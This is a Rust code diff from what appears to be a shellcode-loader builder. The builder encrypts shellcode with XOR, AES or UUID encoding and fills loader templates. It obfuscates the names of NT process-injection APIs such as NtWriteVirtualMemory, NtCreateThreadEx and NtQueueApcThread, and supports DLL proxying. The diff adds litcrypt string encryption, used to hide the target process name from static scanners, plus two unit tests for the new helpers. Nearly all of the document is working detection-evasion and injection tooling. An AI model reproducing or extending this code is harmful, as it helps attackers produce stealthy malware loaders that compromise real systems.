@@ -3,7 +3,9 @@ use crate::arg_parser::{Encryption, Execution, Format, Order};
 use crate::dll_proxy;
 use crate::pe_parser;
 use crate::sandbox::build_sandbox;
-use crate::tools::{random_aes_iv, random_aes_key, random_u8, EncryptionOutput};
+use crate::tools::{
+    litcrypt_string_expr, random_aes_iv, random_aes_key, random_u8, EncryptionOutput,
+};
 use crate::uuid_enc::encrypt_uuid;
 use crate::xor::encrypt_xor;
 use fs_extra::dir::{copy, CopyOptions};
@@ -29,6 +31,17 @@ fn non_zero_random_key() -> u8 {
 }
 
 const OUTPUT_DIR: &str = "shared";
+const LITCRYPT_DEPENDENCY: &str = r#"litcrypt = "0.4""#;
+const LITCRYPT_SETUP: &str = "#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();";
+
+fn build_dependencies(template_dependencies: Option<String>) -> String {
+    match template_dependencies {
+        Some(dependencies) if !dependencies.trim().is_empty() => {
+            format!("{}\n{}", LITCRYPT_DEPENDENCY, dependencies)
+        }
+        _ => LITCRYPT_DEPENDENCY.to_string(),
+    }
+}
 
 fn search_and_replace(
     path_to_file: &Path,
@@ -96,9 +109,12 @@ fn build_encrypted_output(order: &Order, src_dir: &Path) -> (EncryptionOutput, S
 
     let output = match order.encryption {
         Encryption::Xor => encrypt_xor(&order.shellcode_path, &path, non_zero_random_key()),
-        Encryption::Aes => {
-            encrypt_aes(&order.shellcode_path, &path, &random_aes_key(), &random_aes_iv())
-        }
+        Encryption::Aes => encrypt_aes(
+            &order.shellcode_path,
+            &path,
+            &random_aes_key(),
+            &random_aes_iv(),
+        ),
         Encryption::Uuid => encrypt_uuid(&order.shellcode_path, &path),
     };
 
@@ -107,16 +123,21 @@ fn build_encrypted_output(order: &Order, src_dir: &Path) -> (EncryptionOutput, S
 
 fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, String> {
     let (enc_output, include_path) = build_encrypted_output(order, src_dir);
+    let dependencies = build_dependencies(enc_output.dependencies);
 
     let mut replacements: HashMap<&'static str, String> = HashMap::new();
     replacements.insert("{{PATH_TO_SHELLCODE}}", include_path);
     replacements.insert("{{DECRYPTION_FUNCTION}}", enc_output.decryption_function);
     replacements.insert("{{MAIN}}", enc_output.main);
-    replacements.insert("{{DEPENDENCIES}}", enc_output.dependencies.unwrap_or_default());
+    replacements.insert("{{DEPENDENCIES}}", dependencies);
     replacements.insert("{{IMPORTS}}", enc_output.imports.unwrap_or_default());
+    replacements.insert("{{LITCRYPT_SETUP}}", LITCRYPT_SETUP.to_string());
     replacements.insert("{{DLL_MAIN}}", String::new());
     replacements.insert("{{DLL_FORMAT}}", String::new());
-    replacements.insert("{{TARGET_PROCESS}}", order.target_process.clone());
+    replacements.insert(
+        "{{TARGET_PROCESS}}",
+        litcrypt_string_expr(&order.target_process),
+    );
     replacements.insert("{{SANDBOX}}", String::new());
     replacements.insert("{{SANDBOX_IMPORTS}}", String::new());
 
@@ -128,14 +149,38 @@ fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, St
 
     let api_key = non_zero_random_key();
     replacements.insert("{{API_KEY}}", format!("0x{:02x}", api_key));
-    replacements.insert("{{OBF_NT_OPEN_PROCESS}}", obfuscate_api_name("NtOpenProcess", api_key));
-    replacements.insert("{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtAllocateVirtualMemory", api_key));
-    replacements.insert("{{OBF_NT_WRITE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtWriteVirtualMemory", api_key));
-    replacements.insert("{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}", obfuscate_api_name("NtProtectVirtualMemory", api_key));
-    replacements.insert("{{OBF_NT_CREATE_THREAD_EX}}", obfuscate_api_name("NtCreateThreadEx", api_key));
-    replacements.insert("{{OBF_NT_QUEUE_APC_THREAD}}", obfuscate_api_name("NtQueueApcThread", api_key));
-    replacements.insert("{{OBF_NT_TEST_ALERT}}", obfuscate_api_name("NtTestAlert", api_key));
-    replacements.insert("{{OBF_NT_DELAY_EXECUTION}}", obfuscate_api_name("NtDelayExecution", api_key));
+    replacements.insert(
+        "{{OBF_NT_OPEN_PROCESS}}",
+        obfuscate_api_name("NtOpenProcess", api_key),
+    );
+    replacements.insert(
+        "{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}",
+        obfuscate_api_name("NtAllocateVirtualMemory", api_key),
+    );
+    replacements.insert(
+        "{{OBF_NT_WRITE_VIRTUAL_MEMORY}}",
+        obfuscate_api_name("NtWriteVirtualMemory", api_key),
+    );
+    replacements.insert(
+        "{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}",
+        obfuscate_api_name("NtProtectVirtualMemory", api_key),
+    );
+    replacements.insert(
+        "{{OBF_NT_CREATE_THREAD_EX}}",
+        obfuscate_api_name("NtCreateThreadEx", api_key),
+    );
+    replacements.insert(
+        "{{OBF_NT_QUEUE_APC_THREAD}}",
+        obfuscate_api_name("NtQueueApcThread", api_key),
+    );
+    replacements.insert(
+        "{{OBF_NT_TEST_ALERT}}",
+        obfuscate_api_name("NtTestAlert", api_key),
+    );
+    replacements.insert(
+        "{{OBF_NT_DELAY_EXECUTION}}",
+        obfuscate_api_name("NtDelayExecution", api_key),
+    );
 
     replacements
 }
@@ -225,17 +270,35 @@ fn apply_dll_format(
     lib_rs_path
 }
 
-fn apply_replacements(
-    replacements: &HashMap<&str, String>,
-    main_path: &Path,
-    cargo_path: &Path,
-) {
+fn apply_replacements(replacements: &HashMap<&str, String>, main_path: &Path, cargo_path: &Path) {
     for (key, value) in replacements {
         search_and_replace(main_path, key, value)
             .unwrap_or_else(|e| eprintln!("Warning: template replace failed for {}: {}", key, e));
         search_and_replace(cargo_path, key, value)
             .unwrap_or_else(|e| eprintln!("Warning: cargo replace failed for {}: {}", key, e));
     }
+}
+
+fn proxy_module_insert_offset(existing: &str) -> usize {
+    if let Some(pos) = existing.find("use_litcrypt!();") {
+        let after_marker = pos + "use_litcrypt!();".len();
+        return after_marker
+            + existing[after_marker..]
+                .find('\n')
+                .map(|newline| newline + 1)
+                .unwrap_or(0);
+    }
+
+    let mut inner_attr_end = 0;
+    for line in existing.lines() {
+        let trimmed = line.trim();
+        if trimmed.starts_with("#!") || trimmed.is_empty() {
+            inner_attr_end += line.len() + 1;
+        } else {
+            break;
+        }
+    }
+    inner_attr_end.min(existing.len())
 }
 
 fn apply_proxy(order: &Order, folder: &Path) {
@@ -258,21 +321,11 @@ fn apply_proxy(order: &Order, folder: &Path) {
 
     let lib_rs_path = src_dir.join("lib.rs");
     let existing = fs::read_to_string(&lib_rs_path).expect("Failed to read lib.rs");
-
-    // Insert `mod proxy;` after inner attributes (#![...]) to avoid breaking them
-    let mut inner_attr_end = 0;
-    for line in existing.lines() {
-        let trimmed = line.trim();
-        if trimmed.starts_with("#!") || trimmed.is_empty() {
-            inner_attr_end += line.len() + 1; // +1 for newline
-        } else {
-            break;
-        }
-    }
+    let insert_at = proxy_module_insert_offset(&existing);
     let updated = format!(
         "{}\n#[allow(non_upper_case_globals, non_snake_case)]\nmod proxy;\n{}",
-        &existing[..inner_attr_end.min(existing.len())].trim_end(),
-        &existing[inner_attr_end.min(existing.len())..]
+        &existing[..insert_at].trim_end(),
+        &existing[insert_at..]
     );
     fs::write(&lib_rs_path, updated).expect("Failed to update lib.rs with mod proxy");
 
@@ -287,8 +340,7 @@ pub fn assemble(order: Order) -> PathBuf {
     println!("[+] Assembling Rust code..");
 
     let template_path = template_path_for_execution(&order.execution);
-    let folder = create_root_folder(Path::new(OUTPUT_DIR))
-        .expect("Failed to create output folder");
+    let folder = create_root_folder(Path::new(OUTPUT_DIR)).expect("Failed to create output folder");
     copy_template(template_path, &folder).expect("Failed to copy template");
 
     let src_dir = folder.join("src");
@@ -311,4 +363,26 @@ pub fn assemble(order: Order) -> PathBuf {
 
     println!("[+] Done assembling Rust code!");
     folder
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn test_build_dependencies_always_includes_litcrypt() {
+        assert_eq!(build_dependencies(None), r#"litcrypt = "0.4""#);
+        assert_eq!(
+            build_dependencies(Some(r#"libaes = "0.7""#.to_string())),
+            "litcrypt = \"0.4\"\nlibaes = \"0.7\""
+        );
+    }
+
+    #[test]
+    fn test_proxy_module_insert_offset_keeps_litcrypt_first() {
+        let source = "#![windows_subsystem = \"windows\"]\n\n#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();\n\nuse std::include_bytes;\n";
+        let insert_at = proxy_module_insert_offset(source);
+        assert!(source[..insert_at].contains("use_litcrypt!();"));
+        assert!(source[insert_at..].starts_with('\n'));
+    }
 }
